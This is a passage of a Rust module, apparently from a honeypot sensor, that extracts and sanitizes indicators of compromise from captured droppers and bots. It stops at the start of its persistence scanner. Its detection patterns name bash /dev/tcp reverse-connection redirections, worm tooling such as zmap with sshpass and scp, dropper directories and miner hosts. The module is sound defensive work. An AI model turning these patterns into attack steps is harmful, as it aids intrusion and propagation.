//! Indicator extraction from captured text: a dropper script, a systemd unit streamed over stdin,
//! a command line. Pure text scanning, no I/O and no shell evaluation, like `fetcher::extract`,
//! whose URL resolver it reuses.
//!
//! Every input is attacker data, and so is every indicator taken from it. Each value and detail
//! goes through [`sanitize_field`] (the sensors' own sanitizer, then a byte cap) before it leaves
//! this module, the number of indicators per input is capped, and the console renders them as
//! escaped text, never as a link. A password hash is reduced to a marker (its scheme and a digest
//! prefix of the crypt string): it is evidence that a credential was planted, not a credential.
//!
//! The kinds and how each is recognized:
//! - `url`: what `fetcher::extract::extract_urls` resolves (http, https and tftp forms, simple
//!   variable assignments and one level of `for` loop); detail is the host and port.
//! - `endpoint`: bash `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` redirections.
//! - `ssh_key`: an OpenSSH public key line whose base64 blob decodes and names its own key type;
//!   the value is the `SHA256:` fingerprint `ssh-keygen -l` prints, the detail the type and comment.
//! - `rsa_key`: a PEM `PUBLIC KEY` or `RSA PUBLIC KEY` block; the value is the SHA-256 of its DER.
//! - `password_hash`: `$1$`, `$5$`, `$6$` (with optional `rounds=`), `$2a$/$2b$/$2y$` and `$y$`
//!   crypt strings, stored as a marker only.
//! - `irc_server` and `irc_channel`: in text that speaks IRC (`PRIVMSG`, `NICK`, `JOIN`, a 666x
//!   port), `irc.` host names and hosts on IRC ports; channels after `JOIN` or assigned to a
//!   variable whose name contains `chan`.
//! - `hosts_entry`: an address and host name pair on a line that writes `/etc/hosts` (a sinkhole).
//! - `persistence`: cron entries (`@reboot`-style or five time fields), systemd unit names and
//!   `ExecStart=` lines, writes to `/etc/rc.local`, lines that create or remove `/etc/init.d`
//!   scripts, and the `/var/tmp`, `/tmp` or `/dev/shm` drop path such an rc.local or init.d line
//!   starts (detail `drop path`). A `%s` template, as a binary carries it before filling in its
//!   own name, is kept as written.
//! - `url` also carries a CoinHive-family miner script (`coinhive.com`, `coin-hive.com` or
//!   `authedmine.com` under `/lib/`), with detail `CoinHive miner script`.
//! - `credentials` also carries `CoinHive site key`, from a `CoinHive.Anonymous(` or
//!   `CoinHive.User(` call: that the miner is configured, never the key.
//! - `rsa_key` also carries the SHA-256 of a known signing certificate found in a zip-format
//!   artifact (an APK): today the public AOSP test key. Only a certificate stored uncompressed
//!   is seen (the APK Signing Block of v2 and later; a deflated `META-INF/*.RSA` is not).
//!
//! A captured artifact that is not small UTF-8 text (a compiled bot) is scanned through its
//! printable strings, the way `strings -a` lists them: runs of at least [`MIN_STRING_LEN`]
//! printable ASCII bytes from the first [`MAX_BINARY_SCAN_BYTES`] bytes, at most
//! [`MAX_STRINGS_TEXT_BYTES`] of them, each run on its own line.

use std::collections::HashSet;
use std::net::Ipv4Addr;

use base64::Engine;
use base64::engine::general_purpose::{STANDARD, STANDARD_NO_PAD};
use sensor_framework::sanitize_value;
use sha2::{Digest, Sha256};

/// Indicators kept from one captured artifact.
pub const MAX_IOCS_PER_ARTIFACT: usize = 64;
/// Indicators kept from one command or download event.
pub const MAX_IOCS_PER_COMMAND: usize = 16;
/// Longest stored value, in bytes, after sanitization.
pub const MAX_IOC_VALUE_BYTES: usize = 256;
/// Longest stored detail, in bytes, after sanitization.
pub const MAX_IOC_DETAIL_BYTES: usize = 128;
/// Largest artifact scanned as text, and the size of each piece of strings text scanned. A dropper
/// or unit file is a few KB; this also bounds each scan.
pub const MAX_ARTIFACT_TEXT_BYTES: usize = 64 * 1024;
/// Largest artifact read for its printable strings: a compiled bot is tens of KB to a few MB.
pub const MAX_BINARY_SCAN_BYTES: usize = 8 * 1024 * 1024;
/// Shortest printable run kept as a string.
pub const MIN_STRING_LEN: usize = 6;
/// Most strings text kept from one binary.
pub const MAX_STRINGS_TEXT_BYTES: usize = 256 * 1024;
/// Longest cron or rc.local line kept as a persistence value, in characters, before the byte cap.
const MAX_PERSISTENCE_LINE_CHARS: usize = 200;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum IocKind {
    Url,
    Endpoint,
    SshKey,
    RsaKey,
    PasswordHash,
    IrcServer,
    IrcChannel,
    HostsEntry,
    Persistence,
    Proxy,
    Credentials,
}

impl IocKind {
    pub const ALL: [IocKind; 11] = [
        IocKind::Url,
        IocKind::Endpoint,
        IocKind::SshKey,
        IocKind::RsaKey,
        IocKind::PasswordHash,
        IocKind::IrcServer,
        IocKind::IrcChannel,
        IocKind::HostsEntry,
        IocKind::Persistence,
        IocKind::Proxy,
        IocKind::Credentials,
    ];

    /// The stored `ioc.kind` value (migration 0015's CHECK list).
    pub fn as_str(self) -> &'static str {
        match self {
            IocKind::Url => "url",
            IocKind::Endpoint => "endpoint",
            IocKind::SshKey => "ssh_key",
            IocKind::RsaKey => "rsa_key",
            IocKind::PasswordHash => "password_hash",
            IocKind::IrcServer => "irc_server",
            IocKind::IrcChannel => "irc_channel",
            IocKind::HostsEntry => "hosts_entry",
            IocKind::Persistence => "persistence",
            IocKind::Proxy => "proxy",
            IocKind::Credentials => "credentials",
        }
    }

    pub fn parse(s: &str) -> Option<IocKind> {
        IocKind::ALL.into_iter().find(|k| k.as_str() == s)
    }

    /// The console's label for the kind.
    pub fn label(self) -> &'static str {
        match self {
            IocKind::Url => "URL",
            IocKind::Endpoint => "endpoint",
            IocKind::SshKey => "SSH key",
            IocKind::RsaKey => "RSA public key",
            IocKind::PasswordHash => "password hash",
            IocKind::IrcServer => "IRC server",
            IocKind::IrcChannel => "IRC channel",
            IocKind::HostsEntry => "hosts entry",
            IocKind::Persistence => "persistence",
            IocKind::Proxy => "proxy",
            IocKind::Credentials => "embedded credentials",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Indicator {
    pub kind: IocKind,
    pub value: String,
    pub detail: String,
}

/// Neutralize one attacker-derived string for storage: line breaks, terminal escapes, control,
/// bidirectional and invisible characters go (`sensor_framework::sanitize_value`), then the result
/// is trimmed and cut to `max_bytes` on a character boundary.
pub fn sanitize_field(raw: &str, max_bytes: usize) -> String {
    sanitize_value(raw, max_bytes).trim().to_string()
}

/// Whether a captured body is text worth scanning: valid UTF-8, no NUL, and at most 1 in 50
/// characters a control character other than a line break or tab.
pub fn looks_like_text(bytes: &[u8]) -> bool {
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    if text.contains('\0') {
        return false;
    }
    let total = text.chars().count().max(1);
    let controls = text
        .chars()
        .filter(|c| c.is_control() && !matches!(c, '\n' | '\r' | '\t'))
        .count();
    controls * 50 <= total
}

/// How an artifact was read for indicators.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ArtifactRead {
    /// Small UTF-8 text, scanned whole.
    Text,
    /// Anything else, scanned through its printable strings.
    Strings,
}

/// The printable strings of `bytes` as `strings -a` lists them: runs of at least `min` bytes that
/// are printable ASCII or tab, one per line, at most `max_out` bytes in all.
pub fn printable_strings(bytes: &[u8], min: usize, max_out: usize) -> String {
    let mut out = String::new();
    let mut start = None;
    for (i, &b) in bytes.iter().chain(std::iter::once(&0)).enumerate() {
        if (0x20..=0x7e).contains(&b) || b == b'\t' {
            start.get_or_insert(i);
            continue;
        }
        if let Some(s) = start.take()
            && i - s >= min
        {
            let run = &bytes[s..i];
            if out.len() + run.len() + 1 > max_out {
                break;
            }
            // Every byte of the run is ASCII, so this never replaces anything.
            out.push_str(&String::from_utf8_lossy(run));
            out.push('\n');
        }
    }
    out
}

/// The text an artifact is scanned as, or `None` when it is larger than
/// [`MAX_BINARY_SCAN_BYTES`].
pub fn artifact_text(bytes: &[u8]) -> Option<(ArtifactRead, String)> {
    if bytes.len() <= MAX_ARTIFACT_TEXT_BYTES
        && looks_like_text(bytes)
        && let Ok(text) = std::str::from_utf8(bytes)
    {
        return Some((ArtifactRead::Text, text.to_string()));
    }
    if bytes.len() > MAX_BINARY_SCAN_BYTES {
        return None;
    }
    let mut strings = printable_strings(bytes, MIN_STRING_LEN, MAX_STRINGS_TEXT_BYTES);
    // The signing certificate is binary, so it is found here and handed to the text scan as a line.
    for name in known_signing_certs(bytes, &KNOWN_SIGNING_CERTS) {
        strings.push_str(&format!("{SIGNING_CERT_MARKER}{name}\n"));
    }
    Some((ArtifactRead::Strings, strings))
}

/// A signing certificate worth an indicator: its DER length, SHA-256 and name.
struct KnownCert {
    der_len: usize,
    sha256: [u8; 32],
    name: &'static str,
    /// What the console shows beside it.
    detail: &'static str,
}

/// The public AOSP test key certificate (`build/target/product/security/testkey.x509.pem` in the
/// Android Open Source Project; CN=Android, emailAddress=android@android.com). Anyone can sign
/// with it, so an APK carrying it was signed by a build that had no key of its own.
const KNOWN_SIGNING_CERTS: [KnownCert; 1] = [KnownCert {
    der_len: 1196,
    sha256: [
        0xA4, 0x0D, 0xA8, 0x0A, 0x59, 0xD1, 0x70, 0xCA, 0xA9, 0x50, 0xCF, 0x15, 0xC1, 0x8C, 0x45,
        0x4D, 0x47, 0xA3, 0x9B, 0x26, 0x98, 0x9D, 0x8B, 0x64, 0x0E, 0xCD, 0x74, 0x5B, 0xA7, 0x1B,
        0xF5, 0xDC,
    ],
    name: "aosp-testkey",
    detail: "APK signed with the public AOSP test key (CN=Android)",
}];

/// A line [`artifact_text`] adds for each known certificate found in the bytes, followed by the
/// certificate's name. Text that carries the same line is read the same way; the claim it makes
/// is a public certificate's name, so forging it gains nothing.
const SIGNING_CERT_MARKER: &str = "propolis-signing-cert ";

/// Most candidate certificates hashed per artifact, so a body packed with look-alikes costs a
/// bounded amount.
const MAX_CERT_CANDIDATES: usize = 64;

/// The names of the `known` certificates whose DER appears whole inside `bytes`, when `bytes` is a
/// zip (an APK is). A DER certificate is a SEQUENCE with a two-byte length (`30 82 LL LL`), so
/// each place that starts one with a known total length is hashed and compared.
fn known_signing_certs(bytes: &[u8], known: &[KnownCert]) -> Vec<&'static str> {
    if !bytes.starts_with(b"PK\x03\x04") {
        return Vec::new();
    }
    let mut found = Vec::new();
    let mut hashed = 0;
    for (at, window) in bytes.windows(4).enumerate() {
        if window[0] != 0x30 || window[1] != 0x82 {
            continue;
        }
        let total = 4 + usize::from(u16::from_be_bytes([window[2], window[3]]));
        let Some(cert) = known.iter().find(|k| k.der_len == total) else {
            continue;
        };
        let Some(der) = bytes.get(at..at + total) else {
            continue;
        };
        hashed += 1;
        if Sha256::digest(der).as_slice() == cert.sha256 && !found.contains(&cert.name) {
            found.push(cert.name);
        }
        if hashed >= MAX_CERT_CANDIDATES {
            break;
        }
    }
    found
}

fn signing_certs(text: &str, out: &mut Collector) {
    for line in text.lines() {
        let Some(name) = line.strip_prefix(SIGNING_CERT_MARKER) else {
            continue;
        };
        if let Some(cert) = KNOWN_SIGNING_CERTS.iter().find(|k| k.name == name.trim()) {
            let fingerprint = cert
                .sha256
                .iter()
                .map(|b| format!("{b:02X}"))
                .collect::<Vec<_>>()
                .join(":");
            out.push(
                IocKind::RsaKey,
                &format!("certificate SHA256:{fingerprint}"),
                cert.detail,
            );
        }
    }
}

/// Hosts that served CoinHive's browser miner and its opt-in variant.
const MINER_HOSTS: [&str; 3] = ["coinhive.com", "coin-hive.com", "authedmine.com"];

/// A miner script URL (`<host>/lib/<name>.js` on a [`MINER_HOSTS`] host), recorded as written
/// including a leading scheme or `//`; and whether the page configures a miner, which is a flag
/// and never the site key.
fn miner(text: &str, out: &mut Collector) {
    let lower = text.to_ascii_lowercase();
    for host in MINER_HOSTS {
        let needle = format!("{host}/lib/");
        for (at, _) in lower.match_indices(&needle) {
            // `evilcoinhive.com` is another host; `cdn.coinhive.com` is this one.
            if lower[..at]
                .chars()
                .next_back()
                .is_some_and(|c| c.is_ascii_alphanumeric() || c == '-')
            {
                continue;
            }
            let end = at
                + lower[at..]
                    .find(|c: char| !(c.is_ascii_alphanumeric() || "./_-".contains(c)))
                    .unwrap_or(lower.len() - at);
            if !lower[at..end].ends_with(".js") {
                continue;
            }
            // Any subdomain labels, then a scheme or `//`, belong to the URL as written.
            let host_start = lower[..at]
                .trim_end_matches(|c: char| c.is_ascii_alphanumeric() || ".-".contains(c))
                .len();
            let start = ["https://", "http://", "//"]
                .iter()
                .find(|p| lower[..host_start].ends_with(**p))
                .map_or(host_start, |p| host_start - p.len());
            out.push(IocKind::Url, &text[start..end], "CoinHive miner script");
        }
    }
    for call in ["CoinHive.Anonymous", "CoinHive.User"] {
        for (at, _) in text.match_indices(call) {
            if text[at + call.len()..].trim_start().starts_with('(') {
                out.push(
                    IocKind::Credentials,
                    "CoinHive site key",
                    CREDENTIALS_DETAIL,
                );
            }
        }
    }
}

/// The indicators in a captured artifact and how it was read, or `None` when it is larger than
/// [`MAX_BINARY_SCAN_BYTES`].
pub fn extract_from_artifact(bytes: &[u8]) -> Option<(ArtifactRead, Vec<Indicator>)> {
    let (read, text) = artifact_text(bytes)?;
    Some((read, extract_artifact_text(&text)))
}

/// The indicators in an artifact's text as [`artifact_text`] produced it, at most
/// [`MAX_IOCS_PER_ARTIFACT`].
pub fn extract_artifact_text(text: &str) -> Vec<Indicator> {
    let mut out = Collector::new(MAX_IOCS_PER_ARTIFACT);
    // Strings text can exceed one scan's size; it is scanned a line-aligned piece at a time.
    let mut rest = text;
    while !rest.is_empty() && !out.full() {
        let piece = truncate(rest, MAX_ARTIFACT_TEXT_BYTES);
        let piece = match piece.len() < rest.len() {
            true => piece.rfind('\n').map_or(piece, |nl| &piece[..=nl]),
            false => piece,
        };
        scan_into(piece, &mut out);
        rest = &rest[piece.len().max(1).min(rest.len())..];
    }
    out.items
}

/// The indicators in one command line.
pub fn extract_from_command(command: &str) -> Vec<Indicator> {
    extract(command, MAX_IOCS_PER_COMMAND)
}

/// Whether a script carries both a network scanner and a way to copy itself to the hosts it finds:
/// the shape of a worm such as the Raspberry Pi one (zmap, then sshpass and scp). A heuristic, used
/// only to label a sample campaign's members as infected hosts on the console.
pub fn self_propagating(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    let scans = ["zmap", "masscan", "pnscan"]
        .iter()
        .any(|t| lower.contains(t));
    let copies = ["sshpass", "scp "].iter().any(|t| lower.contains(t));
    scans && copies
}

/// Every indicator in `text`, at most `cap`, the highest-value kinds first so a crafted flood of
/// URLs cannot push a planted key out of the result.
pub fn extract(text: &str, cap: usize) -> Vec<Indicator> {
    let mut out = Collector::new(cap);
    scan_into(truncate(text, MAX_ARTIFACT_TEXT_BYTES), &mut out);
    out.items
}

fn scan_into(text: &str, out: &mut Collector) {
    ssh_keys(text, out);
    pem_keys(text, out);
    password_hashes(text, out);
    hosts_entries(text, out);
    irc(text, out);
    persistence(text, out);
    proxy(text, out);
    signing_certs(text, out);
    // Before `urls`, which would record the same script URL with only its host as detail.
    miner(text, out);
    urls(text, out);
    endpoints(text, out);
}

struct Collector {
    items: Vec<Indicator>,
    seen: HashSet<(IocKind, String)>,
    cap: usize,
}

impl Collector {
    fn new(cap: usize) -> Self {
        Self {
            items: Vec::new(),
            seen: HashSet::new(),
            cap,
        }
    }

    fn full(&self) -> bool {
        self.items.len() >= self.cap
    }

    fn push(&mut self, kind: IocKind, value: &str, detail: &str) {
        if self.full() {
            return;
        }
        let value = sanitize_field(&redact_secrets(value), MAX_IOC_VALUE_BYTES);
        if value.is_empty() || !self.seen.insert((kind, value.clone())) {
            return;
        }
        self.items.push(Indicator {
            kind,
            value,
            detail: sanitize_field(&redact_secrets(detail), MAX_IOC_DETAIL_BYTES),
        });
    }
}

/// `text` made safe to paste and impossible to follow by accident, the convention threat feeds
/// use: the `http`, `https`, `ftp` and `tftp` schemes become `hxxp`, `hxxps`, `fxp` and `tfxp`;
/// the dots of a host name or IPv4 address become `[.]`; the colons of an IPv6 address become
/// `[:]`; and the `@` of an email address or of user information before a host becomes `[@]`.
/// Paths, commands and other words are left as they are, so a persistence line stays readable.
/// Pure text: nothing is resolved or looked up.
pub fn defang(text: &str) -> String {
    let is_separator = |c: char| c.is_whitespace() || "'\"`;|&(),=".contains(c);
    let mut out = String::with_capacity(text.len() + 16);
    let mut rest = text;
    while !rest.is_empty() {
        let sep = rest.find(|c: char| !is_separator(c)).unwrap_or(rest.len());
        out.push_str(&rest[..sep]);
        rest = &rest[sep..];
        let word = rest.find(is_separator).unwrap_or(rest.len());
        out.push_str(&defang_word(&rest[..word]));
        rest = &rest[word..];
    }
    out
}

fn defang_dots(host: &str) -> String {
    host.replace('.', "[.]")
}

/// A host with an optional port: an IPv4 address or a named host gets its dots bracketed, a
/// bracketed IPv6 address its colons. `None` when it is neither.
fn defang_host_port(s: &str) -> Option<String> {
    if let Some(inner) = s.strip_prefix('[') {
        let (addr, tail) = inner.split_once(']')?;
        addr.parse::<std::net::Ipv6Addr>().ok()?;
        return Some(format!("[{}]{tail}", addr.replace(':', "[:]")));
    }
    let (host, port) = match s.rsplit_once(':') {
        Some((h, p)) if !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()) => (h, Some(p)),
        _ => (s, None),
    };
    if host.parse::<Ipv4Addr>().is_ok() || is_named_host(host) {
        return Some(match port {
            Some(p) => format!("{}:{p}", defang_dots(host)),
            None => defang_dots(host),
        });
    }
    None
}

fn defang_word(word: &str) -> String {
    if let Some((scheme, rest)) = word.split_once("://") {
        let scheme = match scheme.to_ascii_lowercase().as_str() {
            "http" => "hxxp".to_string(),
            "https" => "hxxps".to_string(),
            "ftp" => "fxp".to_string(),
            "tftp" => "tfxp".to_string(),
            _ => scheme.to_string(),
        };
        let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
        let (authority, path) = rest.split_at(end);
        let authority = match authority.rsplit_once('@') {
            Some((user, host)) => format!(
                "{user}[@]{}",
                defang_host_port(host).unwrap_or_else(|| host.to_string())
            ),
            None => defang_host_port(authority).unwrap_or_else(|| authority.to_string()),
        };
        return format!("{scheme}://{authority}{path}");
    }
    if word.parse::<std::net::Ipv6Addr>().is_ok() {
        return word.replace(':', "[:]");
    }
    if let Some(host) = defang_host_port(word) {
        return host;
    }
    if let Some((user, host)) = word.rsplit_once('@')
        && !user.is_empty()
        && !user.contains('/')
        && let Some(host) = defang_host_port(host)
    {
        return format!("{user}[@]{host}");
    }
    word.to_string()
}

/// The text that stands in for a removed secret.
const REDACTED: &str = "<redacted>";

/// `text` with the secrets a kept line can carry replaced by [`REDACTED`]: the user information of
/// every `scheme://user:pass@host`, and the value after an `Authorization:` or
/// `Proxy-Authorization:` scheme. A `%s`-style template value is not a secret and is kept.
pub fn redact_secrets(text: &str) -> String {
    let ends_authority = |c: char| c == '/' || c.is_whitespace() || "'\"`".contains(c);
    let mut out = text.to_string();
    let mut from = 0;
    while let Some(rel) = out.get(from..).and_then(|s| s.find("://")) {
        let start = from + rel + 3;
        let end = out[start..]
            .find(ends_authority)
            .map_or(out.len(), |e| start + e);
        match out[start..end].rfind('@') {
            Some(at) => {
                out.replace_range(start..start + at, REDACTED);
                from = start + REDACTED.len() + 1;
            }
            None => from = end,
        }
    }
    let mut from = 0;
    loop {
        // ASCII lowercasing keeps every byte offset, so positions carry over to `out`.
        let lower = out.to_ascii_lowercase();
        let Some(rel) = lower.get(from..).and_then(|s| s.find("authorization:")) else {
            break;
        };
        let after = from + rel + "authorization:".len();
        let rest = &out[after..];
        let scheme_start = rest.len() - rest.trim_start().len();
        let scheme_len = rest[scheme_start..]
            .find(char::is_whitespace)
            .unwrap_or(rest.len() - scheme_start);
        let value_at = scheme_start + scheme_len;
        let value_start = value_at + (rest[value_at..].len() - rest[value_at..].trim_start().len());
        let value_len = rest[value_start..]
            .find(|c: char| c.is_whitespace() || "'\"\\".contains(c))
            .unwrap_or(rest.len() - value_start);
        let value = &rest[value_start..value_start + value_len];
        if value.is_empty() || value.starts_with('%') {
            from = after;
            continue;
        }
        let (a, b) = (after + value_start, after + value_start + value_len);
        out.replace_range(a..b, REDACTED);
        from = a + REDACTED.len();
    }
    out
}

fn truncate(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut end = max;
    while !text.is_char_boundary(end) {
        end -= 1;
    }
    &text[..end]
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

/// Shell words, split on whitespace, quotes and the operators that end a word, with a literal
/// trailing `\n` (an `echo -e` line end) removed.
fn words(line: &str) -> Vec<&str> {
    line.split(|c: char| {
        c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '|' | '>' | '<' | '`' | '(' | ')')
    })
    .map(|w| w.trim_end_matches("\\n").trim_end_matches("\\r"))
    .filter(|w| !w.is_empty())
    .collect()
}

fn is_hostname(s: &str) -> bool {
    s.len() <= 253
        && s.contains('.')
        && !s.starts_with('.')
        && !s.ends_with('.')
        && s.parse::<Ipv4Addr>().is_err()
        && s.chars().any(|c| c.is_ascii_alphabetic())
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-'))
}

const SSH_KEY_TYPES: [&str; 8] = [
    "ssh-rsa",
    "ssh-dss",
    "ssh-ed25519",
    "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384",
    "ecdsa-sha2-nistp521",
    "sk-ssh-ed25519@openssh.com",
    "sk-ecdsa-sha2-nistp256@openssh.com",
];

/// The OpenSSH SHA-256 fingerprint of a key blob whose leading string names `key_type`, as
/// `ssh-keygen -l` prints it; `None` when the blob does not decode or names another type.
fn ssh_fingerprint(key_type: &str, blob_b64: &str) -> Option<String> {
    let blob = STANDARD.decode(blob_b64).ok()?;
    let len = u32::from_be_bytes(blob.get(..4)?.try_into().ok()?) as usize;
    if blob.get(4..4 + len)? != key_type.as_bytes() {
        return None;
    }
    Some(format!(
        "SHA256:{}",
        STANDARD_NO_PAD.encode(Sha256::digest(&blob))
    ))
}

fn ssh_keys(text: &str, out: &mut Collector) {
    for line in text.lines() {
        let w = words(line);
        for (i, word) in w.iter().enumerate() {
            if !SSH_KEY_TYPES.contains(word) {
                continue;
            }
            let Some(fingerprint) = w.get(i + 1).and_then(|b| ssh_fingerprint(word, b)) else {
                continue;
            };
            let comment = w
                .get(i + 2)
                .filter(|c| {
                    c.len() <= 64
                        && !SSH_KEY_TYPES.contains(c)
                        && c.chars()
                            .all(|ch| ch.is_ascii_alphanumeric() || "@._+=-".contains(ch))
                })
                .map(|c| format!(", comment {c}"))
                .unwrap_or_default();
            out.push(IocKind::SshKey, &fingerprint, &format!("{word}{comment}"));
        }
    }
}

fn pem_keys(text: &str, out: &mut Collector) {
    for label in ["PUBLIC KEY", "RSA PUBLIC KEY"] {
        let begin = format!("-----BEGIN {label}-----");
        let end = format!("-----END {label}-----");
        let mut rest = text;
        while let Some(at) = rest.find(&begin) {
            let body_start = at + begin.len();
            let Some(len) = rest[body_start..].find(&end) else {
                break;
            };
            let body: String = rest[body_start..body_start + len]
                .replace("\\n", "")
                .replace("\\r", "")
                .chars()
                .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '='))
                .collect();
            if let Ok(der) = STANDARD.decode(&body)
                && der.len() >= 32
            {
                out.push(
                    IocKind::RsaKey,
                    &format!("SHA256:{}", STANDARD_NO_PAD.encode(Sha256::digest(&der))),
                    &format!("PEM {label}, {}-byte DER", der.len()),
                );
            }
            rest = &rest[body_start + len + end.len()..];
        }
    }
}

fn is_crypt_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '/')
}

/// The scheme name and byte length of a crypt string at the start of `s` (which starts with `$`).
fn crypt_at(s: &str) -> Option<(&'static str, usize)> {
    // Counting stops one past `max`, so a long run costs no more than the longest valid field.
    let take = |s: &str, min: usize, max: usize| -> Option<usize> {
        let n = s
            .chars()
            .take(max + 1)
            .take_while(|&c| is_crypt_char(c))
            .count();
        (min..=max).contains(&n).then_some(n)
    };
    let rest = s.strip_prefix('$')?;
    // Every scheme id is one or two characters, so only the next three bytes are looked at: a
    // search for the closing `$` across the rest of the text would make a body of many `$`
    // quadratic.
    let id_len = rest.bytes().take(3).position(|b| b == b'$')?;
    let (id, after) = (&rest[..id_len], &rest[id_len + 1..]);
    let head = 1 + id.len() + 1;
    match id {
        "1" | "5" | "6" => {
            let scheme = match id {
                "1" => "md5-crypt",
                "5" => "sha256-crypt",
                _ => "sha512-crypt",
            };
            let mut used = 0;
            let mut fields = after;
            if let Some(r) = fields.strip_prefix("rounds=") {
                let digits = r.chars().take_while(char::is_ascii_digit).count();
                if digits == 0 || r.as_bytes().get(digits) != Some(&b'$') {
                    return None;
                }
                used += "rounds=".len() + digits + 1;
                fields = &r[digits + 1..];
            }
            let salt = fields
                .chars()
                .take(17)
                .take_while(|&c| is_crypt_char(c))
                .count();
            if !(1..=16).contains(&salt) || fields.as_bytes().get(salt) != Some(&b'$') {
                return None;
            }
            let hash = take(&fields[salt + 1..], 22, 86)?;
            Some((scheme, head + used + salt + 1 + hash))
        }
        "2a" | "2b" | "2y" => {
            let cost = after.get(..3)?;
            if !(cost.as_bytes()[..2].iter().all(u8::is_ascii_digit) && cost.ends_with('$')) {
                return None;
            }
            let n = take(&after[3..], 53, 53)?;
            Some(("bcrypt", head + 3 + n))
        }
        "y" => {
            let params = take(after, 1, 32)?;
            let salt_part = after.get(params..)?.strip_prefix('$')?;
            let salt = take(salt_part, 1, 64)?;
            let hash_part = salt_part.get(salt..)?.strip_prefix('$')?;
            let hash = take(hash_part, 43, 43)?;
            Some(("yescrypt", head + params + 1 + salt + 1 + hash))
        }
        _ => None,
    }
}

fn password_hashes(text: &str, out: &mut Collector) {
    for (at, _) in text.match_indices('$') {
        if out.full() {
            return;
        }
        // A crypt string is a whole word: `$6$...` inside `x$6$...` is not one.
        if at > 0 && text[..at].chars().next_back().is_some_and(is_crypt_char) {
            continue;
        }
        let Some((scheme, len)) = crypt_at(&text[at..]) else {
            continue;
        };
        let crypt = &text[at..at + len];
        if text[at + len..].chars().next().is_some_and(is_crypt_char) {
            continue;
        }
        let digest = hex(&Sha256::digest(crypt.as_bytes()));
        out.push(
            IocKind::PasswordHash,
            &format!("{scheme} sha256:{}", &digest[..16]),
            "marker only: the hash itself is not stored",
        );
    }
}

fn hosts_entries(text: &str, out: &mut Collector) {
    for line in text.lines().filter(|l| l.contains("/etc/hosts")) {
        let w = words(line);
        for pair in w.windows(2) {
            if pair[0].parse::<Ipv4Addr>().is_ok() && is_hostname(pair[1]) {
                out.push(
                    IocKind::HostsEntry,
                    &format!("{} {}", pair[0], pair[1]),
                    "written to /etc/hosts",
                );
            }
        }
    }
}

const IRC_PORTS: [u16; 12] = [
    6660, 6661, 6662, 6663, 6664, 6665, 6666, 6667, 6668, 6669, 6697, 7000,
];

fn speaks_irc(text: &str) -> bool {
    let upper = text.to_ascii_uppercase();
    [
        "PRIVMSG", "NICK ", "JOIN ", "JOIN :#", ":6667", " 6667", ":6697",
    ]
    .iter()
    .any(|m| upper.contains(m))
}

fn channel_name(s: &str) -> Option<&str> {
    let s = s.trim_start_matches(':');
    let len = s
        .char_indices()
        .take_while(|&(i, c)| {
            (i == 0 && c == '#') || (i > 0 && (c.is_ascii_alphanumeric() || "_-.".contains(c)))
        })
        .count();
    (2..=50).contains(&len).then(|| &s[..len])
}

fn irc(text: &str, out: &mut Collector) {
    if !speaks_irc(text) {
        return;
    }
    for line in text.lines() {
        let w = words(line);
        for (i, word) in w.iter().enumerate() {
            if word.eq_ignore_ascii_case("JOIN")
                && let Some(chan) = w.get(i + 1).and_then(|c| channel_name(c))
            {
                out.push(IocKind::IrcChannel, chan, "joined");
            }
            // `chan="#x"` splits at the quote into `chan=` and `#x`; `chan=#x` stays one word.
            let (name, value) = match word.split_once('=') {
                Some((n, "")) => (n, w.get(i + 1).copied().unwrap_or_default()),
                Some((n, v)) => (n, v),
                None => ("", ""),
            };
            if name.to_ascii_lowercase().contains("chan")
                && let Some(chan) = channel_name(value)
            {
                out.push(IocKind::IrcChannel, chan, &format!("assigned to {name}"));
            }
            for candidate in [*word, value] {
                let (host, port) = match candidate.rsplit_once(':') {
                    Some((h, p)) => (h, p.parse::<u16>().ok()),
                    None => (candidate, None),
                };
                let host = host.trim_start_matches('@');
                let irc_name = host.to_ascii_lowercase().starts_with("irc.") && is_hostname(host);
                let irc_port = port.is_some_and(|p| IRC_PORTS.contains(&p))
                    && (is_hostname(host) || host.parse::<Ipv4Addr>().is_ok());
                if irc_name || irc_port {
                    let value = match port {
                        Some(p) => format!("{host}:{p}"),
                        None => host.to_string(),
                    };
                    out.push(IocKind::IrcServer, &value, "IRC server");
                }
            }
        }
    }
}

const CRON_SPECIALS: [&str; 8] = [
    "@reboot",
    "@hourly",
    "@daily",
    "@weekly",
    "@monthly",
    "@yearly",
    "@annually",
    "@midnight",
];

/// `line` from byte `start` up to the first quote, or the end of the line, trimmed and shortened.
fn clause_from(line: &str, start: usize) -> String {
    let tail = &line[start..];
    let end = tail.find(['"', '\'']).unwrap_or(tail.len());
    tail[..end]
        .trim()
        .trim_end_matches("\\n")
        .chars()
        .take(MAX_PERSISTENCE_LINE_CHARS)
        .collect()
}

fn is_cron_field(w: &str) -> bool {
    !w.is_empty() && w.chars().all(|c| c.is_ascii_digit() || "*/,-".contains(c))
}

/// Shell operations that write a file, for telling a write to a startup file from a read of it.
const WRITE_OPS: [&str; 6] = ["echo", ">>", "> ", "sed ", "tee", "printf"];

/// Shell startup files whose appended line runs at every login.
const SHELL_PROFILES: [&str; 5] = [
    ".bashrc",
    ".bash_profile",
    ".profile",
    "/etc/profile",
    ".zshrc",
];

/// Directories a dropper copies its binary into: the world-writable ones, and the system
/// directories it hides among.
const DROP_DIRS: [&str; 10] = [
    "/var/tmp/",
    "/dev/shm/",
    "/tmp/",
    "/usr/lib/",
    "/usr/bin/",
    "/usr/sbin/",
    "/usr/local/bin/",
    "/lib/",
    "/bin/",
    "/sbin/",
];

fn persistence(text: &str, out: &mut Collector) {
